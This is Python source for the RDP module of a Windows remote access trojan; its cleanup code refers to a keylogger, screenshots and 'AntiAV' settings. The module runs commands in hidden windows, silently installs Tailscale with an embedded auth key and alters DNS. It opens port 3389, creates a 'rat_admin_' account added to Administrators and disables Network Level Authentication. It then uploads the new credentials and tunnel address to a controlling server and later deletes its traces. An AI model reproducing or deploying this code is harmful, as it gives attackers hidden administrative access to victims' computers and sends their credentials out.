import logging
import os
import json
import socket
import subprocess
import uuid
import winreg
import requests
import ctypes
import time
import string
import random
import sys
import re
from typing import Dict, Optional, Any
from config import Config
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator

class RDPController:
    def __init__(self, encryption_manager: EncryptionManager):
        self.encryption = encryption_manager
        self.communicator = ServerCommunicator(Config.get_client_id(), encryption_manager)
        self.username = f"rat_admin_{uuid.uuid4().hex[:8]}"
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        self.password = ''.join(random.choice(chars) for _ in range(14))
        self.behavior = {"rdp_enabled": True}  # پیش‌فرض رفتا
        self.tailscale_ip = None
        if Config.DEBUG_MODE:
            logging.info(f"RDPController initialized. User: {self.username}, Pass: {self.password[:4]}****")

    def _is_admin(self) -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception as e:
            logging.error(f"Admin check error: {str(e)}")
            return False

    def _run_command(self, cmd: list, timeout: int = 30) -> Dict[str, str]:
        try:
            logging.debug(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            output = {
                "status": "success" if result.returncode == 0 else "error",
                "stdout": result.stdout.strip(),
                "stderr": result.stderr.strip()
            }
            if "longer than 14 characters" in output['stderr']:
                output['stderr'] += "\n[WARN] Legacy Windows password restriction detected!"
            elif "The specified rule already exists" in output['stderr']:
                output['status'] = "success"
                output['stderr'] += "\n[INFO] Rule already exists"
            elif "Access is denied" in output['stderr']:
                output['stderr'] += "\n[ERROR] Insufficient permissions"
            logging.debug(f"Command result: {output}")
            return output
        except Exception as e:
            logging.error(f"Command execution crashed: {str(e)}")
            return {"status": "error", "stdout": "", "stderr": str(e)}

    def _set_dns(self) -> bool:
        """
        Set DNS servers (e.g., Shecan) on the active network adapter.
        """
        try:
            # Get active network adapter name
            result = self._run_command(["powershell", "-Command", "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"])
            if result["status"] != "success" or not result["stdout"].strip():
                logging.error(f"Failed to get active network adapter: {result['stderr']}")
                return False
            adapter_name = result["stdout"].strip()

            # Set primary DNS
            cmd_primary = [
                "netsh", "interface", "ip", "set", "dns",
                f"name={adapter_name}", "source=static",
                f"addr={Config.PRIMARY_DNS}"
            ]
            result_primary = self._run_command(cmd_primary)
            if result_primary["status"] != "success":
                logging.error(f"Failed to set primary DNS: {result_primary['stderr']}")
                return False

            # Set secondary DNS
            cmd_secondary = [
                "netsh", "interface", "ip", "add", "dns",
                f"name={adapter_name}", f"addr={Config.SECONDARY_DNS}",
                "index=2"
            ]
            result_secondary = self._run_command(cmd_secondary)
            if result_secondary["status"] != "success":
                logging.error(f"Failed to set secondary DNS: {result_secondary['stderr']}")
                return False

            logging.info(f"DNS set to {Config.PRIMARY_DNS} and {Config.SECONDARY_DNS} on adapter {adapter_name}")
            return True
        except Exception as e:
            logging.error(f"Error setting DNS: {str(e)}")
            return False

    def _get_tailscale_ip(self) -> bool:
        """
        Get the Tailscale IP of the current device.
        """
        try:
            result = self._run_command(["tailscale", "ip", "-4"])
            if result["status"] == "success" and result["stdout"]:
                self.tailscale_ip = result["stdout"].strip()
                logging.info(f"Tailscale IP obtained: {self.tailscale_ip}")
                return True
            else:
                logging.error(f"Failed to get Tailscale IP: {result['stderr']}")
                return False
        except Exception as e:
            logging.error(f"Error getting Tailscale IP: {str(e)}")
            return False

    def _ensure_tailscale_running(self) -> bool:
        """
        Ensure Tailscale is running and connected.
        """
        try:
            # Check if Tailscale is installed
            if not os.path.exists(Config.TAILSCALE_BINARY):
                logging.info("Installing Tailscale...")
                result = self._run_command([
                    "powershell", "-Command",
                    "$installer = \"$env:TEMP\\tailscale-installer.exe\"; "
                    "Invoke-WebRequest -Uri 'https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe' -OutFile $installer; "
                    "Start-Process -FilePath $installer -ArgumentList '/S' -Wait; "
                    "Remove-Item $installer"
                ])
                if result["status"] != "success":
                    logging.error(f"Failed to install Tailscale: {result['stderr']}")
                    return False

            # Check Tailscale status
            result = self._run_command(["tailscale", "status"])
            if result["status"] == "success" and "connected" in result["stdout"].lower():
                return self._get_tailscale_ip()

            # Start Tailscale with auth key
            result = self._run_command(["tailscale", "up", f"--authkey={Config.TAILSCALE_AUTH_KEY}"])
            if result["status"] == "success":
                time.sleep(5)  # Wait for connection
                return self._get_tailscale_ip()
            else:
                logging.error(f"Failed to start Tailscale: {result['stderr']}")
                return False
        except Exception as e:
            logging.error(f"Error checking Tailscale status: {str(e)}")
            return False

    def _configure_firewall(self) -> bool:
        """
        Configure firewall rules to allow RDP on Tailscale IP.
        """
        try:
            # Remove existing rules
            self._run_command(["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"])
            # Add new rule for Tailscale IP
            cmd = [
                "netsh", "advfirewall", "firewall", "add", "rule",
                "name=Allow RDP", "dir=in", "action=allow",
                "protocol=TCP", "localport=3389", "profile=any", "enable=yes"
            ]
            result = self._run_command(cmd)
            if result["status"] == "success":
                logging.info("Firewall rule for RDP added")
                return True
            else:
                logging.error(f"Failed to configure firewall: {result['stderr']}")
                return False
        except Exception as e:
            logging.error(f"Firewall configuration error: {str(e)}")
            return False

    def _user_exists(self, username: str) -> bool:
        try:
            ps_command = f"Get-LocalUser -Name '{username}' -ErrorAction SilentlyContinue"
            result = self._run_command(["powershell", "-Command", ps_command])
            return result["status"] == "success" and username in result["stdout"]
        except Exception as e:
            logging.error(f"User check failed: {str(e)}")
            return False

    def _is_user_in_group(self, username: str, group: str) -> bool:
        try:
            ps_command = f"Get-LocalGroupMember -Group '{group}' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name"
            result = self._run_command(["powershell", "-Command", ps_command])
            return result["status"] == "success" and username in result["stdout"]
        except Exception as e:
            logging.error(f"Group check failed: {str(e)}")
            return False

    def _start_service(self, service_name: str) -> bool:
        try:
            result = self._run_command(["sc", "query", service_name])
            if result["status"] == "success" and "RUNNING" not in result["stdout"]:
                logging.info(f"Starting service {service_name}...")
                result = self._run_command(["net", "start", service_name])
                if result["status"] != "success":
                    logging.error(f"Failed to start service {service_name}: {result['stderr']}")
                    return False
            logging.info(f"Service {service_name} is running")
            return True
        except Exception as e:
            logging.error(f"Service start failed: {str(e)}")
            return False

    def _configure_firewall(self) -> bool:
        logging.info("Configuring firewall rules for RDP...")
        cleanup_commands = [
            ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
            ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue"],
            ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'AllowRDP' -ErrorAction SilentlyContinue"]
        ]
        for cmd in cleanup_commands:
            result = self._run_command(cmd)
            if result["status"] == "success":
                logging.info(f"Cleaned up firewall rule: {cmd[0]}")
            else:
                logging.debug(f"Cleanup command {cmd[0]} output: {result['stderr']}")
        methods = [
            {
                "type": "powershell_new",
                "cmd": [
                    "powershell", "-Command",
                    "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -Enabled True"
                ],
                "validation": lambda: self._run_command(
                    ["powershell", "-Command", "Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $True }"]
                )["status"] == "success"
            },
            {
                "type": "powershell_set",
                "cmd": [
                    "powershell", "-Command",
                    "if (Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue) { "
                    "Set-NetFirewallRule -DisplayName 'Allow RDP' -Enabled True -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any } else { "
                    "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -Enabled True }"
                ],
                "validation": lambda: self._run_command(
                    ["powershell", "-Command", "Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $True }"]
                )["status"] == "success"
            },
            {
                "type": "netsh",
                "cmd": [
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    "name=Allow RDP", "dir=in", "action=allow",
                    "protocol=TCP", "localport=3389", "profile=any", "enable=yes"
                ],
                "validation": lambda: "Enabled: Yes" in self._run_command(
                    ["netsh", "advfirewall", "firewall", "show", "rule", "name=Allow RDP"]
                )["stdout"]
            }
        ]
        for attempt in range(3):
            logging.info(f"Firewall configuration attempt {attempt+1}")
            for method in methods:
                try:
                    result = self._run_command(method["cmd"])
                    logging.debug(f"Firewall {method['type']} result: {result}")
                    if result["status"] == "success":
                        if method["validation"]():
                            logging.info(f"Firewall rule applied via {method['type']}")
                            return True
                        else:
                            logging.warning(f"Validation failed for {method['type']}: {result['stdout'][:100]}...")
                    else:
                        logging.warning(f"Failed to apply rule via {method['type']}: {result['stderr'][:100]}...")
                except Exception as e:
                    logging.error(f"Error in firewall method {method['type']}: {str(e)}")
                time.sleep(2)
        if self._check_port(3389):
            logging.info("Port 3389 is open despite firewall rule failure; proceeding")
            return True
        logging.error("All firewall configuration methods failed")
        return False

    def _create_user(self) -> bool:
        logging.info(f"Creating user {self.username}")
        if self._user_exists(self.username):
            logging.info(f"User {self.username} exists, resetting password...")
            result = self._run_command(["net", "user", self.username, self.password[:14]])
            if result["status"] == "success":
                return True
            logging.error(f"Failed to reset password: {result['stderr']}")
            return False
        methods = [
            {
                "type": "netuser",
                "cmd": ["net", "user", self.username, self.password[:14], "/add"],
                "validation": lambda: self._user_exists(self.username)
            },
            {
                "type": "powershell",
                "cmd": [
                    "powershell", "-Command",
                    f"$pass = ConvertTo-SecureString '{self.password}' -AsPlainText -Force; "
                    f"New-LocalUser -Name '{self.username}' -Password $pass -AccountNeverExpires -Description 'RDP User'"
                ],
                "validation": lambda: self._user_exists(self.username)
            }
        ]
        for method in methods:
            for attempt in range(3):
                result = self._run_command(method["cmd"])
                if result["status"] == "success" and method["validation"]():
                    logging.info(f"User created via {method['type']}")
                    return True
                logging.warning(f"User creation attempt {attempt+1} via {method['type']} failed: {result['stderr']}")
                time.sleep(1)
        logging.error("All user creation methods failed")
        return False

    def _configure_user_groups(self) -> bool:
        groups = ["Administrators", "Remote Desktop Users"]
        for group in groups:
            if not self._is_user_in_group(self.username, group):
                for attempt in range(3):
                    cmd = ["net", "localgroup", group, self.username, "/add"]
                    result = self._run_command(cmd)
                    if result["status"] == "success":
                        logging.info(f"Added {self.username} to {group}")
                        break
                    logging.warning(f"Failed to add to {group}, attempt {attempt+1}: {result['stderr']}")
                    time.sleep(1)
                else:
                    logging.error(f"Failed to add {self.username} to {group}")
                    return False
        return True

    def _enable_rdp_registry(self) -> bool:
        try:
            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "fAllowToGetHelp", 0, winreg.REG_DWORD, 1)
            reg_path_tcp = r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path_tcp, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "PortNumber", 0, winreg.REG_DWORD, 3389)
            result = self._run_command([
                "reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
                "/v", "UserAuthentication", "/t", "REG_DWORD", "/d", "0", "/f"
            ])
            if result["status"] == "success":
                logging.info("NLA disabled for RDP compatibility")
            result = self._run_command(["gpupdate", "/force"])
            if result["status"] == "success":
                logging.info("Group Policy updated")
            else:
                logging.warning(f"Group Policy update failed: {result['stderr']}")
            logging.info("RDP enabled in registry")
            return True
        except Exception as e:
            logging.error(f"Registry error: {str(e)}")
            return False

    def _check_port(self, port: int) -> bool:
        try:
            for attempt in range(3):
                result = self._run_command(["netstat", "-an"])
                if result["status"] == "success" and f":{port}" in result["stdout"] and "LISTENING" in result["stdout"]:
                    logging.info(f"Port {port} is open")
                    return True
                logging.debug(f"Port check attempt {attempt+1} failed")
                time.sleep(2)
            logging.warning(f"Port {port} is not open")
            return False
        except Exception as e:
            logging.error(f"Port check failed: {str(e)}")
            return False
    def update_behavior(self, behavior: Dict):
        """
        به‌روزرسانی تنظیمات رفتار (مثل rdp_enabled) از AntiAV یا سرور
        """
        self.behavior.update(behavior)
        if Config.DEBUG_MODE:
            logging.info(f"RDPController behavior updated: {self.behavior}")

    
    def enable_rdp(self) -> Dict[str, Any]:
        if not self._is_admin():
            logging.warning("Administrator access required to enable RDP")
            return {
                "status": "error",
                "error": "Administrator access required",
                "username": "",
                "password": "",
                "tunnel_url": ""
            }
        if not self.behavior["rdp_enabled"]:
            logging.info("RDP disabled by configuration")
            return {
                "status": "error",
                "error": "RDP disabled by configuration",
                "username": "",
                "password": "",
                "tunnel_url": ""
            }
        try:
            logging.info("Starting RDP enable...")
            # Set DNS to ensure Tailscale connectivity
            if not self._set_dns():
                logging.warning("Failed to set DNS, proceeding with current DNS settings")

            # Ensure Tailscale is running
            if not self._ensure_tailscale_running():
                return {
                    "status": "error",
                    "error": "Failed to connect to Tailscale",
                    "username": "",
                    "password": "",
                    "tunnel_url": ""
                }
            # Configure firewall
            if not self._configure_firewall():
                return {
                    "status": "error",
                    "error": "Failed to configure firewall",
                    "username": "",
                    "password": "",
                    "tunnel_url": ""
                }
            # Create user
            if not self._create_user():
                return {
                    "status": "error",
                    "error": "Failed to create user",
                    "username": "",
                    "password": "",
                    "tunnel_url": ""
                }
            # Configure user groups
            if not self._configure_user_groups():
                return {
                    "status": "error",
                    "error": "Failed to configure user groups",
                    "username": "",
                    "password": "",
                    "tunnel_url": ""
                }
            # Enable RDP in registry
            if not self._enable_rdp_registry():
                return {
                    "status": "error",
                    "error": "Failed to enable RDP in registry",
                    "username": "",
                    "password": "",
                    "tunnel_url": ""
                }

            tunnel_info = {
                "client_id": Config.get_client_id(),
                "username": self.username,
                "password": self.password,
                "tunnel_url": f"{self.tailscale_ip}:3389"
            }
            self.communicator.upload(tunnel_info)
            logging.info("RDP enabled successfully")
            return {
                "status": "success",
                "message": "RDP enabled successfully",
                "username": self.username,
                "password": self.password,
                "tunnel_url": f"{self.tailscale_ip}:3389"
            }
        except Exception as e:
            logging.error(f"Error enabling RDP: {str(e)}")
            return {
                "status": "error",
                "error": f"Failed to enable RDP: {str(e)}",
                "username": "",
                "password": "",
                "tunnel_url": ""
            }

    def cleanup_rdp(self) -> Dict[str, Any]:
        try:
            if not self._is_admin():
                logging.error("Administrator privileges required for cleanup")
                return {
                    "status": "error",
                    "message": "Administrator privileges required",
                    "details": []
                }

            logging.info("Starting comprehensive RDP cleanup...")
            details = []

            # Disable RDP in registry
            try:
                reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
                details.append({"action": "disable_rdp_reg", "status": "success", "message": "RDP disabled in registry"})
            except Exception as e:
                details.append({"action": "disable_rdp_reg", "status": "error", "message": str(e)})

            # Remove firewall rules
            result = self._run_command(["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"])
            if result["status"] == "success":
                details.append({"action": "remove_firewall_rule", "status": "success", "message": "Firewall rule removed"})
            else:
                details.append({"action": "remove_firewall_rule", "status": "error", "message": result["stderr"]})

            # Remove users
            try:
                ps_command = "Get-LocalUser | Where-Object { $_.Name -like 'rat_admin_*' } | Select-Object -ExpandProperty Name"
                result = self._run_command(["powershell", "-Command", ps_command])
                if result["status"] == "success" and result["stdout"].strip():
                    users = result["stdout"].splitlines()
                    for user in users:
                        user = user.strip()
                        if user:
                            del_result = self._run_command(["net", "user", user, "/delete"])
                            if del_result["status"] == "success":
                                details.append({"action": f"remove_user_{user}", "status": "success", "message": f"Deleted user {user}"})
                            else:
                                details.append({"action": f"remove_user_{user}", "status": "error", "message": del_result["stderr"]})
                else:
                    details.append({"action": "remove_users", "status": "success", "message": "No rat_admin_* users found"})
            except Exception as e:
                details.append({"action": "remove_users", "status": "error", "message": str(e)})

            # Remove temporary files
            temp_files = ["keylogger.log", "screenshot.png", "recursive_list.txt", "rdp_diagnostic.log"]
            for file in temp_files:
                try:
                    if os.path.exists(file):
                        os.remove(file)
                        details.append({"action": f"remove_file_{file}", "status": "success", "message": f"Removed {file}"})
                except Exception as e:
                    details.append({"action": f"remove_file_{file}", "status": "error", "message": str(e)})

            # Reset DNS to DHCP (optional, to avoid permanent changes)
            try:
                result = self._run_command(["powershell", "-Command", "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"])
                if result["status"] == "success" and result["stdout"].strip():
                    adapter_name = result["stdout"].strip()
                    self._run_command(["netsh", "interface", "ip", "set", "dns", f"name={adapter_name}", "source=dhcp"])
                    details.append({"action": "reset_dns", "status": "success", "message": "DNS reset to DHCP"})
            except Exception as e:
                details.append({"action": "reset_dns", "status": "error", "message": str(e)})

            # Report cleanup
            try:
                cleanup_report = {
                    "client_id": Config.get_client_id(),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "details": details
                }
                self.communicator.report_cleanup(cleanup_report)
                details.append({"action": "report_cleanup", "status": "success", "message": "Cleanup reported to server"})
            except Exception as e:
                details.append({"action": "report_cleanup", "status": "error", "message": str(e)})

            return {
                "status": "success",
                "message": "RDP cleanup completed successfully",
                "details": details
            }
        except Exception as e:
            logging.error(f"RDP cleanup error: {str(e)}")
            return {
                "status": "error",
                "message": f"RDP cleanup failed: {str(e)}",
                "details": []
            }
        
    def start(self):
        if not self.behavior["rdp_enabled"]:
            logging.info("RDP start skipped due to AntiAV behavior settings")
            return
        result = self.enable_rdp()
        if result["status"] == "success":
            logging.info("RDP started successfully")
        else:
            logging.error(f"Failed to start RDP: {result['message']}")